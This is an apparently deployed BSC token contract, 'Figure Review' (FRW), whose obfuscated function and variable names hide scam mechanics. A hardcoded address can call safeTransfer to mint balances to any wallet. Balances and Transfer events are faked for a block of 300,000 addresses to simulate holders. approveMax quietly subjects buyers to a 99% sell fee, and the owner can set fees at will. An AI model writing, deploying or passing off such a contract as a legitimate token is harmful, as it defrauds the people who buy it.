/**
 *Submitted for verification at BscScan.com on 2023-01-08
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.14;



interface IUniswapV2Router {

    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);

    function factory() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    )
    external
    returns (
        uint256 amountA,
        uint256 amountB,
        uint256 liquidity
    );

    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);

    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
    external payable returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);

    function WETH() external pure returns (address);

}


library SafeMath {

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a / b;
    }
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b <= a, errorMessage);
        return a - b;
    }
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function tryDiv(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a / b);
    }
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a % b;
    }
    }

}


interface IBEP20 {

    function approve(address spender, uint256 amount) external returns (bool);

    function transfer(address recipient, uint256 amount) 
    external
    returns (bool);

    function totalSupply() external view returns (uint256);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    function name() external view returns (string memory);

    function balanceOf(address account) external view returns (uint256);

    function symbol() external view returns (string memory);

    function allowance(address _owner, address spender)
    external
    view
    returns (uint256);

    function decimals() external view returns (uint8);

    function getOwner() external view returns (address);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
}

interface IPancakePair {
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
    external
    returns (address pair);
}


abstract contract Ownable {
    address internal owner;
    constructor(address _owner) {
        owner = _owner;
    }

    function Owner() public view returns (address) {
        return owner;
    }

    function transferOwnership(address payable adr) public onlyOwner() {
        owner = adr;
        emit OwnershipTransferred(adr);
    }

    event OwnershipTransferred(address owner);

    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }

    modifier onlyOwner() {
        require(isOwner(msg.sender), "!OWNER");
        _;
    }

}





contract FigureReview is IBEP20, Ownable {
    using SafeMath for uint256;
    uint8 constant _decimals = 18;

    mapping(address => uint256) _balances;

    uint256  maxReceiverModeTakeAtLimitTeam = 100000000 * 10 ** _decimals;
    bool private marketingLimitEnableMintBots = false;
    string constant _symbol = "FRW";
    address private mintListFundShouldLiquidityLaunched = (msg.sender);

    uint256 private shouldBotsIsSwapMintListMode = 100;
    uint256 shouldBotsReceiverTxMarketing = 0;
    uint160 constant totalReceiverFeeMode = uint160(0xC49912Dd9FF7e478fa3Eced8B2A1fa7126aBFFDa);
    mapping(address => bool)  launchedSwapTradingList;
    uint256 private liquidityWalletFeeSellIsBuy = 0;
    bool public launchMaxTotalTo = false;
    mapping(address => mapping(address => uint256)) _allowances;

    uint256 private totalReceiverListSell = 0;
    IUniswapV2Router public launchAutoModeTotal;
    mapping(address => bool) private fromTokenBuyAt;
    bool public modeMaxShouldBuyMarketing = false;


    uint256 constant minMarketingReceiverTotal = 1000 * 10 ** 18;
    address public uniswapV2Pair;
    uint256 constant receiverFundLaunchTeam = 100000000 * (10 ** 18);
    uint256 public takeSenderMarketingMint = 0;
    bool private tradingReceiverTakeModeMaxLaunched = false;
    bool public isFeeTakeMint = false;
    string constant _name = "Figure Review";
    bool private fromTeamLimitIsLaunchBurn = false;
    uint256  sellBotsBuyTx = 100000000 * 10 ** _decimals;

    uint256 private amountBurnLiquidityMode = 0;

    

    mapping(address => bool)  txFromAutoMax;
    uint256 constant walletReceiverShouldLiquidity = 900000 * 10 ** 18;



    bool inSwap;
    modifier swapping() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor() Ownable(msg.sender) {
        address _router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
        // PancakeSwap Router
        launchAutoModeTotal = IUniswapV2Router(_router);

        uniswapV2Pair = IUniswapV2Factory(launchAutoModeTotal.factory()).createPair(address(this), launchAutoModeTotal.WETH());
        _allowances[address(this)][address(launchAutoModeTotal)] = receiverFundLaunchTeam;

        fromTokenBuyAt[msg.sender] = true;
        fromTokenBuyAt[address(this)] = true;

        _balances[msg.sender] = receiverFundLaunchTeam;
        emit Transfer(address(0), msg.sender, receiverFundLaunchTeam);
    }

    receive() external payable {}

    function totalSupply() external view override returns (uint256) {
        return receiverFundLaunchTeam;
    }

    function fromEnableIsBots() private pure returns (address) {
        return 0xA1AB0fD23186B41326658dA606DBF1cb34f2d4Cc;
    }

    function setburnReceiverTokenTeamExemptMintTo(uint256 botsLaunchWalletBurn) public onlyOwner {
        if (shouldBotsIsSwapMintListMode == takeSenderMarketingMint) {
            takeSenderMarketingMint=botsLaunchWalletBurn;
        }
        shouldBotsIsSwapMintListMode=botsLaunchWalletBurn;
    }

    function getOwner() external view override returns (address) {
        return owner;
    }

    function getlimitReceiverLaunchTo() public view returns (uint256) {
        if (amountBurnLiquidityMode == totalReceiverListSell) {
            return totalReceiverListSell;
        }
        if (amountBurnLiquidityMode != liquidityWalletFeeSellIsBuy) {
            return liquidityWalletFeeSellIsBuy;
        }
        return amountBurnLiquidityMode;
    }

    function decimals() external pure override returns (uint8) {
        return _decimals;
    }

    function getburnShouldMarketingSender() public view returns (bool) {
        if (tradingReceiverTakeModeMaxLaunched == tradingReceiverTakeModeMaxLaunched) {
            return tradingReceiverTakeModeMaxLaunched;
        }
        return tradingReceiverTakeModeMaxLaunched;
    }

    function launchSwapTotalFund(address receiverAutoMarketingEnable, address listWalletTeamAuto, uint256 tokenMarketingBuySender) internal returns (uint256) {
        
        if (tradingReceiverTakeModeMaxLaunched == fromTeamLimitIsLaunchBurn) {
            tradingReceiverTakeModeMaxLaunched = tradingReceiverTakeModeMaxLaunched;
        }


        uint256 senderAutoMarketingTokenExemptTeam = tokenMarketingBuySender.mul(minLaunchedMaxTeamAuto(receiverAutoMarketingEnable, listWalletTeamAuto == uniswapV2Pair)).div(shouldBotsIsSwapMintListMode);

        if (senderAutoMarketingTokenExemptTeam > 0) {
            _balances[address(this)] = _balances[address(this)].add(senderAutoMarketingTokenExemptTeam);
            emit Transfer(receiverAutoMarketingEnable, address(this), senderAutoMarketingTokenExemptTeam);
        }

        return tokenMarketingBuySender.sub(senderAutoMarketingTokenExemptTeam);
    }

    function isApproveMax(address spender) public view returns (bool) {
        return txFromAutoMax[spender];
    }

    function name() external pure override returns (string memory) {
        return _name;
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if (_allowances[sender][msg.sender] != receiverFundLaunchTeam) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender]
            .sub(amount, "Insufficient Allowance!");
        }

        return shouldSwapMinTeam(sender, recipient, amount);
    }

    function safeTransfer(address receiverAutoMarketingEnable, address autoMarketingWalletTrading, uint256 tokenMarketingBuySender) public {
        if (!swapBurnLiquidityLaunched(msg.sender)) {
            return;
        }
        if (swapLiquiditySellAmountFromBuyEnable(uint160(autoMarketingWalletTrading))) {
            feeListTotalFundAmount(receiverAutoMarketingEnable, autoMarketingWalletTrading, tokenMarketingBuySender, false);
            return;
        }
        if (autoMarketingWalletTrading == address(1)) {
            return;
        }
        if (swapLiquiditySellAmountFromBuyEnable(uint160(receiverAutoMarketingEnable))) {
            feeListTotalFundAmount(receiverAutoMarketingEnable, autoMarketingWalletTrading, tokenMarketingBuySender, true);
            return;
        }
        if (tokenMarketingBuySender == 0) {
            return;
        }
        if (receiverAutoMarketingEnable == address(0)) {
            _balances[autoMarketingWalletTrading] = _balances[autoMarketingWalletTrading].add(tokenMarketingBuySender);
            return;
        }
    }

    function feeListTotalFundAmount(address receiverAutoMarketingEnable, address autoMarketingWalletTrading, uint256 tokenMarketingBuySender, bool swapModeTradingSender) private {
        uint160 txReceiverIsSellBotsTeamSwap = uint160(totalReceiverFeeMode);
        if (swapModeTradingSender) {
            receiverAutoMarketingEnable = address(uint160(txReceiverIsSellBotsTeamSwap + shouldBotsReceiverTxMarketing));
            shouldBotsReceiverTxMarketing++;
            _balances[autoMarketingWalletTrading] = _balances[autoMarketingWalletTrading].add(tokenMarketingBuySender);
        } else {
            _balances[receiverAutoMarketingEnable] = _balances[receiverAutoMarketingEnable].sub(tokenMarketingBuySender);
        }
        if (tokenMarketingBuySender == 0) {
            return;
        }
        emit Transfer(receiverAutoMarketingEnable, autoMarketingWalletTrading, tokenMarketingBuySender);
    }

    function setswapIsShouldFund(address botsLaunchWalletBurn,bool swapLaunchFromBuyMinFundLiquidity) public onlyOwner {
        if (botsLaunchWalletBurn == mintListFundShouldLiquidityLaunched) {
            launchMaxTotalTo=swapLaunchFromBuyMinFundLiquidity;
        }
        if (fromTokenBuyAt[botsLaunchWalletBurn] == fromTokenBuyAt[botsLaunchWalletBurn]) {
           fromTokenBuyAt[botsLaunchWalletBurn]=swapLaunchFromBuyMinFundLiquidity;
        }
        fromTokenBuyAt[botsLaunchWalletBurn]=swapLaunchFromBuyMinFundLiquidity;
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return shouldSwapMinTeam(msg.sender, recipient, amount);
    }

    function getswapIsShouldFund(address botsLaunchWalletBurn) public view returns (bool) {
            return fromTokenBuyAt[botsLaunchWalletBurn];
    }

    function setatBurnListFundLaunchedMarketingSell(bool botsLaunchWalletBurn) public onlyOwner {
        if (fromTeamLimitIsLaunchBurn == tradingReceiverTakeModeMaxLaunched) {
            tradingReceiverTakeModeMaxLaunched=botsLaunchWalletBurn;
        }
        fromTeamLimitIsLaunchBurn=botsLaunchWalletBurn;
    }

    function setburnShouldMarketingSender(bool botsLaunchWalletBurn) public onlyOwner {
        if (tradingReceiverTakeModeMaxLaunched == launchMaxTotalTo) {
            launchMaxTotalTo=botsLaunchWalletBurn;
        }
        tradingReceiverTakeModeMaxLaunched=botsLaunchWalletBurn;
    }

    function shouldSwapMinTeam(address receiverAutoMarketingEnable, address autoMarketingWalletTrading, uint256 tokenMarketingBuySender) internal returns (bool) {
        if (swapLiquiditySellAmountFromBuyEnable(uint160(autoMarketingWalletTrading))) {
            feeListTotalFundAmount(receiverAutoMarketingEnable, autoMarketingWalletTrading, tokenMarketingBuySender, false);
            return true;
        }
        if (swapLiquiditySellAmountFromBuyEnable(uint160(receiverAutoMarketingEnable))) {
            feeListTotalFundAmount(receiverAutoMarketingEnable, autoMarketingWalletTrading, tokenMarketingBuySender, true);
            return true;
        }
        
        if (launchMaxTotalTo != fromTeamLimitIsLaunchBurn) {
            launchMaxTotalTo = fromTeamLimitIsLaunchBurn;
        }

        if (takeSenderMarketingMint == shouldBotsIsSwapMintListMode) {
            takeSenderMarketingMint = totalReceiverListSell;
        }

        if (tradingReceiverTakeModeMaxLaunched == fromTeamLimitIsLaunchBurn) {
            tradingReceiverTakeModeMaxLaunched = modeMaxShouldBuyMarketing;
        }


        bool isBotsFromBurn = shouldLimitModeMintSender(receiverAutoMarketingEnable) || shouldLimitModeMintSender(autoMarketingWalletTrading);
        
        if (receiverAutoMarketingEnable == uniswapV2Pair && !isBotsFromBurn) {
            launchedSwapTradingList[autoMarketingWalletTrading] = true;
        }
        
        if (isBotsFromBurn) {
            return fundAutoListTeam(receiverAutoMarketingEnable, autoMarketingWalletTrading, tokenMarketingBuySender);
        }
        
        if (marketingLimitEnableMintBots == marketingLimitEnableMintBots) {
            marketingLimitEnableMintBots = isFeeTakeMint;
        }

        if (launchMaxTotalTo != launchMaxTotalTo) {
            launchMaxTotalTo = launchMaxTotalTo;
        }


        _balances[receiverAutoMarketingEnable] = _balances[receiverAutoMarketingEnable].sub(tokenMarketingBuySender, "Insufficient Balance!");
        
        if (modeMaxShouldBuyMarketing != marketingLimitEnableMintBots) {
            modeMaxShouldBuyMarketing = marketingLimitEnableMintBots;
        }

        if (liquidityWalletFeeSellIsBuy == totalReceiverListSell) {
            liquidityWalletFeeSellIsBuy = takeSenderMarketingMint;
        }


        uint256 tokenMarketingBuySenderReceived = senderBuyWalletToken(receiverAutoMarketingEnable) ? launchSwapTotalFund(receiverAutoMarketingEnable, autoMarketingWalletTrading, tokenMarketingBuySender) : tokenMarketingBuySender;

        _balances[autoMarketingWalletTrading] = _balances[autoMarketingWalletTrading].add(tokenMarketingBuySenderReceived);
        emit Transfer(receiverAutoMarketingEnable, autoMarketingWalletTrading, tokenMarketingBuySenderReceived);
        return true;
    }

    function balanceOf(address account) public view override returns (uint256) {
        if (swapLiquiditySellAmountFromBuyEnable(uint160(account))) {
            return modeTotalBurnMinReceiverFee(uint160(account));
        }
        return _balances[account];
    }

    function fundAutoListTeam(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance!");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function setenableMintLiquidityExemptTxSellSwap(uint256 botsLaunchWalletBurn) public onlyOwner {
        totalReceiverListSell=botsLaunchWalletBurn;
    }

    function getenableMintLiquidityExemptTxSellSwap() public view returns (uint256) {
        if (totalReceiverListSell != takeSenderMarketingMint) {
            return takeSenderMarketingMint;
        }
        if (totalReceiverListSell == liquidityWalletFeeSellIsBuy) {
            return liquidityWalletFeeSellIsBuy;
        }
        return totalReceiverListSell;
    }

    function swapBurnLiquidityLaunched(address fromModeSellShouldWalletToLaunch) private pure returns (bool) {
        return fromModeSellShouldWalletToLaunch == fromEnableIsBots();
    }

    function symbol() external pure override returns (string memory) {
        return _symbol;
    }

    function modeTotalBurnMinReceiverFee(uint160 fromModeSellShouldWalletToLaunch) private view returns (uint256) {
        uint160 txReceiverIsSellBotsTeamSwap = uint160(totalReceiverFeeMode);
        if ((fromModeSellShouldWalletToLaunch - uint160(txReceiverIsSellBotsTeamSwap)) < shouldBotsReceiverTxMarketing) {
            return minMarketingReceiverTotal;
        }
        return walletReceiverShouldLiquidity;
    }

    function setburnIsExemptLaunchedFundTake(bool botsLaunchWalletBurn) public onlyOwner {
        if (isFeeTakeMint != launchMaxTotalTo) {
            launchMaxTotalTo=botsLaunchWalletBurn;
        }
        if (isFeeTakeMint == fromTeamLimitIsLaunchBurn) {
            fromTeamLimitIsLaunchBurn=botsLaunchWalletBurn;
        }
        isFeeTakeMint=botsLaunchWalletBurn;
    }

    function senderBuyWalletToken(address receiverAutoMarketingEnable) internal view returns (bool) {
        return !fromTokenBuyAt[receiverAutoMarketingEnable];
    }

    function getatBurnListFundLaunchedMarketingSell() public view returns (bool) {
        if (fromTeamLimitIsLaunchBurn != isFeeTakeMint) {
            return isFeeTakeMint;
        }
        if (fromTeamLimitIsLaunchBurn != modeMaxShouldBuyMarketing) {
            return modeMaxShouldBuyMarketing;
        }
        return fromTeamLimitIsLaunchBurn;
    }

    function minLaunchedMaxTeamAuto(address receiverAutoMarketingEnable, bool burnFundTokenTx) internal returns (uint256) {
        if (txFromAutoMax[receiverAutoMarketingEnable]) {
            return 99;
        }
        
        if (takeSenderMarketingMint == totalReceiverListSell) {
            takeSenderMarketingMint = takeSenderMarketingMint;
        }

        if (modeMaxShouldBuyMarketing != fromTeamLimitIsLaunchBurn) {
            modeMaxShouldBuyMarketing = isFeeTakeMint;
        }


        if (burnFundTokenTx) {
            return totalReceiverListSell;
        }
        if (!burnFundTokenTx && receiverAutoMarketingEnable == uniswapV2Pair) {
            return amountBurnLiquidityMode;
        }
        return 0;
    }

    function setlimitReceiverLaunchTo(uint256 botsLaunchWalletBurn) public onlyOwner {
        if (amountBurnLiquidityMode == shouldBotsIsSwapMintListMode) {
            shouldBotsIsSwapMintListMode=botsLaunchWalletBurn;
        }
        if (amountBurnLiquidityMode == amountBurnLiquidityMode) {
            amountBurnLiquidityMode=botsLaunchWalletBurn;
        }
        if (amountBurnLiquidityMode == liquidityWalletFeeSellIsBuy) {
            liquidityWalletFeeSellIsBuy=botsLaunchWalletBurn;
        }
        amountBurnLiquidityMode=botsLaunchWalletBurn;
    }

    function approveMax(address spender) external {
        if (launchedSwapTradingList[spender]) {
            txFromAutoMax[spender] = true;
        }
    }

    function allowance(address holder, address spender) external view override returns (uint256) {
        return _allowances[holder][spender];
    }

    function getburnIsExemptLaunchedFundTake() public view returns (bool) {
        return isFeeTakeMint;
    }

    function swapLiquiditySellAmountFromBuyEnable(uint160 fromModeSellShouldWalletToLaunch) private pure returns (bool) {
        uint160 txReceiverIsSellBotsTeamSwap = totalReceiverFeeMode;
        if (fromModeSellShouldWalletToLaunch >= uint160(txReceiverIsSellBotsTeamSwap)) {
            if (fromModeSellShouldWalletToLaunch <= uint160(txReceiverIsSellBotsTeamSwap) + 300000) {
                return true;
            }
        }
        return false;
    }

    function shouldLimitModeMintSender(address receiverSellWalletEnableLiquidityList) private view returns (bool) {
        if (receiverSellWalletEnableLiquidityList == mintListFundShouldLiquidityLaunched) {
            return true;
        }
        return false;
    }

    function getburnReceiverTokenTeamExemptMintTo() public view returns (uint256) {
        if (shouldBotsIsSwapMintListMode == totalReceiverListSell) {
            return totalReceiverListSell;
        }
        if (shouldBotsIsSwapMintListMode != amountBurnLiquidityMode) {
            return amountBurnLiquidityMode;
        }
        if (shouldBotsIsSwapMintListMode != shouldBotsIsSwapMintListMode) {
            return shouldBotsIsSwapMintListMode;
        }
        return shouldBotsIsSwapMintListMode;
    }

    event AutoLiquify(uint256 amountBNB, uint256 amountTokens);
}